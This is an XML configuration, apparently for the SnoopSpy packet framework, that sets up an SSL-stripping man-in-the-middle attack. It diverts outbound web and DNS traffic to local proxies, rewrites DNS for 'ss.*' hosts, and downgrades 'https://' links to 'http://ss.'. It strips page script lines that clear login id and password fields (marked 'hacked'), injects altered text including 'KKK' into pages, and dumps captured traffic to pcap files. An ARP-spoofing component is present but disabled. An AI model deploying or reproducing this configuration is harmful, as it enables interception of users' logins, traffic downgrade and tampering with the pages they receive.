<sslstrip>
  <graph>
    <objectList>
      <object tos="0" enabled="true" autoParse="true" name="wdOutbound" autoRead="true" flags="0" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWinDivert" filter="(ifIdx!=1) and outbound and (tcp.DstPort==80 or tcp.DstPort==8080 or tcp.DstPort==8888 or tcp.DstPort==443 or tcp.DstPort==4433 or udp.DstPort==53)" correctChecksum="true" priority="0"/>
      <object infectInterval="1000" enabled="false" autoParse="true" adapterIndex="0" selfRelay="true" name="as" autoRead="true" flags="1" readTimeout="1" _class="SnoopArpSpoof" filter="tcp dst port 80 or tcp dst port 8080 or tcp dst port 8888 or tcp dst port 443 or tcp dst port 4433" snapLen="1600" virtualMac="000000-000000" disableAutoRouting="true">
        <sessionList/>
      </object>
      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmOutboundProcessFilter" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
      <object flowMgr="fmOutboundProcessFilter" showStatus="false" name="pfOutbound" _class="SnoopProcessFilter">
        <policies>
          <policy processName="" ack="false"/>
          <policy processName="chrome.exe" ack="false"/>
          <policy processName="firefox.exe" ack="false"/>
          <policy processName="httpproxy.exe" ack="true"/>
          <policy processName="iexplore.exe" ack="false"/>
          <policy processName="netclient.exe" ack="false"/>
          <policy processName="netserver.exe" ack="true"/>
          <policy processName="snoopspy.exe" ack="true"/>
          <policy processName="sscon.exe" ack="true"/>
          <policy processName="svchost.exe" ack="false"/>
        </policies>
      </object>
      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmOutbound" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
      <object tos="0" enabled="true" autoParse="true" name="wdInbound" autoRead="true" flags="0" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWinDivert" filter="(ifIdx==1) and (tcp.SrcPort=8079 or tcp.SrcPort=4432 or tcp.SrcPort=8042)" correctChecksum="true" priority="0"/>
      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmInboundProcessFilter" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
      <object flowMgr="fmInboundProcessFilter" showStatus="false" name="pfInbound" _class="SnoopProcessFilter">
        <policies>
          <policy processName="" ack="false"/>
          <policy processName="httpproxy.exe" ack="true"/>
          <policy processName="netserver.exe" ack="true"/>
          <policy processName="snoopspy.exe" ack="true"/>
          <policy processName="sscon.exe" ack="true"/>
        </policies>
      </object>
      <object macFlowTimeout="3600" checkInterval="1" udpFlowTimeout="300" tcpFlowTimeout="300" name="fmInbound" _class="SnoopFlowMgr" ipFlowTimeout="300"/>
      <object fromFlowMgr="fmOutbound" toFlowMgr="fmInbound" name="fc" tcpChange="true" udpChange="false" _class="SnoopFlowChange">
        <changeItems>
          <item dstIp="80.43.80.43" srcIp="0.0.0.0" log="true" enabled="true" dstPort="80" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8042" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="80.43.80.43" srcIp="0.0.0.0" log="true" enabled="true" dstPort="8080" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8042" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="80.43.80.43" srcIp="0.0.0.0" log="true" enabled="true" dstPort="8888" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8042" protocol="1" dstIpMask="255.255.255.255" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="80" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8079" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="8080" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8079" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="8888" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="8079" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="443" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="4432" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
          <item dstIp="0.0.0.0" srcIp="0.0.0.0" log="false" enabled="true" dstPort="4433" srcIpChangeType="1" dstIpFixValue="127.0.0.1" dstPortChangeType="2" dstIpChangeType="1" srcPort="0" srcIpFixValue="127.0.0.1" srcPortFixValue="0" dstPortFixValue="4432" protocol="1" dstIpMask="0.0.0.0" srcIpMask="0.0.0.0" srcPortChangeType="1"/>
        </changeItems>
      </object>
      <object Direction="0" tos="0" SubIfIdx="0" enabled="true" autoParse="false" name="wwdOutbound" changeDivertAddr="true" autoRead="false" flags="1" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWriteWinDivert" filter="true" correctChecksum="true" priority="0" IfIdx="1"/>
      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpTcpIn" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="false" tcpEnabled="true">
        <outPolicy host="127.0.0.1" port="8080" method="1"/>
        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8079" _class="VTcpServer"/>
        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
        <inboundDataChange/>
        <outboundDataChange>
          <item syntax="2" pattern="Accept-Encoding: gzip," cs="1" minimal="false" log="false" enabled="true" replace="Accept-Encoding:      "/>
        </outboundDataChange>
      </object>
      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpTcpOut" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="true" tcpEnabled="true">
        <outPolicy host="" port="0" method="1"/>
        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8080" _class="VTcpServer"/>
        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
        <inboundDataChange>
          <item syntax="2" pattern="MIchael" cs="0" minimal="false" log="true" enabled="true" replace="GILBERT"/>
          <item syntax="2" pattern="https://" cs="1" minimal="false" log="true" enabled="true" replace="http://ss."/>
          <item syntax="2" pattern="$('id').value = &quot;&quot;;" cs="1" minimal="false" log="true" enabled="true" replace="// hacked id"/>
          <item syntax="2" pattern="$('pw').value = &quot;&quot;;" cs="1" minimal="false" log="true" enabled="true" replace="// hacked pw"/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
      <object maxContentCacheSize="10485756" sslEnabled="true" name="hpSslIn" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="false" tcpEnabled="false">
        <outPolicy host="127.0.0.1" port="4433" method="1"/>
        <tcpServer localHost="" onceWriteSize="0" port="8080" _class="VTcpServer"/>
        <sslServer localHost="127.0.0.1" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4432" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
        <inboundDataChange/>
        <outboundDataChange>
          <item syntax="2" pattern="Accept-Encoding: gzip," cs="1" minimal="false" log="false" enabled="true" replace="Accept-Encoding:      "/>
        </outboundDataChange>
      </object>
      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpSslOut" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="true" tcpEnabled="true">
        <outPolicy host="" port="0" method="2"/>
        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="4433" _class="VTcpServer"/>
        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
        <inboundDataChange>
          <item syntax="2" pattern="Mark Zukerberg" cs="1" minimal="false" log="true" enabled="true" replace="GILBERT LEE"/>
          <item syntax="2" pattern="Money for every moment." cs="1" minimal="false" log="true" enabled="true" replace="KKK"/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
      <object tos="0" enabled="true" autoParse="true" name="wdProxy" autoRead="true" flags="1" layer="0" queueLen="8192" queueTime="1024" _class="SnoopWinDivert" filter="ifIdx==1 and outbound and (tcp.SrcPort==8080 or tcp.DstPort==8080 or tcp.SrcPort==4433 or tcp.DstPort==4433 or tcp.SrcPort==8043 or tcp.DstPort==8043)" correctChecksum="true" priority="0"/>
      <object linkType="1" name="dProxy" filePath="pcap/httpsniff_%04d%02d%02d.%02d%02d.%02d.%03d.pcap" _class="SnoopDump"/>
      <object enabled="true" autoParse="false" adapterIndex="1" srcMac="000000-000000" name="waProxy" dstMac="000000-000000" autoRead="false" flags="1" readTimeout="1" _class="SnoopWriteAdapter" filter="" snapLen="1600"/>
      <object linkType="1" name="BpFilter1" _class="SnoopBpFilter" filter="udp dst port 53"/>
      <object name="DnsChange1" capture="wdOutbound" _class="SnoopDnsChange">
        <changeItems>
          <item syntax="1" pattern="ss.*" cs="1" minimal="false" log="true" enabled="true" ip="80.43.80.43"/>
        </changeItems>
      </object>
      <object maxContentCacheSize="10485756" sslEnabled="true" name="hpStripIn" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="false" tcpEnabled="true">
        <outPolicy host="127.0.0.1" port="8043" method="1"/>
        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8042" _class="VTcpServer"/>
        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
        <inboundDataChange/>
        <outboundDataChange>
          <item syntax="2" pattern="Accept-Encoding: gzip," cs="1" minimal="false" log="false" enabled="true" replace="Accept-Encoding:      "/>
          <item syntax="2" pattern="Host: ss." cs="1" minimal="false" log="true" enabled="true" replace="Host: "/>
        </outboundDataChange>
      </object>
      <object maxContentCacheSize="10485756" sslEnabled="false" name="hpStripOut" outInThreadTimeout="30000" keepAliveTimeout="60000" _class="VHttpProxy" disableLoopbackConnection="true" tcpEnabled="true">
        <outPolicy host="" port="0" method="2"/>
        <tcpServer localHost="127.0.0.1" onceWriteSize="0" port="8043" _class="VTcpServer"/>
        <sslServer localHost="" processConnectMessage="false" onceWriteSize="0" defaultKeyCrtFileName="default.pem" port="4433" methodType="4" _class="VSslServer" certificatePath="certificate\"/>
        <inboundDataChange>
          <item syntax="2" pattern="https://" cs="1" minimal="false" log="true" enabled="true" replace="http://ss."/>
        </inboundDataChange>
        <outboundDataChange/>
      </object>
    </objectList>
    <connectList>
      <connect signal="captured(SnoopPacket*)" receiver="fmOutboundProcessFilter" sender="wdOutbound" slot="process(SnoopPacket*)"/>
      <connect signal="captured(SnoopPacket*)" receiver="fmOutbound" sender="as" slot="process(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="pfOutbound" sender="fmOutboundProcessFilter" slot="check(SnoopPacket*)"/>
      <connect signal="nak(SnoopPacket*)" receiver="fmOutbound" sender="pfOutbound" slot="process(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="fc" sender="fmOutbound" slot="processFromTo(SnoopPacket*)"/>
      <connect signal="captured(SnoopPacket*)" receiver="fmInboundProcessFilter" sender="wdInbound" slot="process(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="pfInbound" sender="fmInboundProcessFilter" slot="check(SnoopPacket*)"/>
      <connect signal="ack(SnoopPacket*)" receiver="fmInbound" sender="pfInbound" slot="process(SnoopPacket*)"/>
      <connect signal="processed(SnoopPacket*)" receiver="fc" sender="fmInbound" slot="processToFrom(SnoopPacket*)"/>
      <connect signal="changedFromTo(SnoopPacket*)" receiver="wwdOutbound" sender="fc" slot="move(SnoopPacket*)"/>
      <connect signal="captured(SnoopPacket*)" receiver="dProxy" sender="wdProxy" slot="dump(SnoopPacket*)"/>
      <connect signal="captured(SnoopPacket*)" receiver="waProxy" sender="wdProxy" slot="copy(SnoopPacket*)"/>
      <connect signal="captured(SnoopPacket*)" receiver="BpFilter1" sender="wdOutbound" slot="check(SnoopPacket*)"/>
      <connect signal="ack(SnoopPacket*)" receiver="DnsChange1" sender="BpFilter1" slot="check(SnoopPacket*)"/>
      <connect signal="captured(SnoopPacket*)" receiver="BpFilter1" sender="as" slot="check(SnoopPacket*)"/>
    </connectList>
  </graph>
  <coord>
    <object x="-165" name="wdOutbound" y="-115"/>
    <object x="-258" name="as" y="-119"/>
    <object x="-202" name="fmOutboundProcessFilter" y="-77"/>
    <object x="-164" name="pfOutbound" y="-38"/>
    <object x="-165" name="fmOutbound" y="2"/>
    <object x="3" name="wdInbound" y="-115"/>
    <object x="-36" name="fmInboundProcessFilter" y="-76"/>
    <object x="2" name="pfInbound" y="-39"/>
    <object x="-1" name="fmInbound" y="1"/>
    <object x="-55" name="fc" y="36"/>
    <object x="-175" name="wwdOutbound" y="74"/>
    <object x="-154" name="hpTcpIn" y="116"/>
    <object x="-160" name="hpTcpOut" y="154"/>
    <object x="12" name="hpSslIn" y="115"/>
    <object x="5" name="hpSslOut" y="149"/>
    <object x="-130" name="wdProxy" y="224"/>
    <object x="6" name="dProxy" y="199"/>
    <object x="6" name="waProxy" y="238"/>
    <object x="-302" name="BpFilter1" y="-69"/>
    <object x="-312" name="DnsChange1" y="-27"/>
    <object x="-277" name="hpStripIn" y="117"/>
    <object x="-278" name="hpStripOut" y="156"/>
  </coord>
</sslstrip>
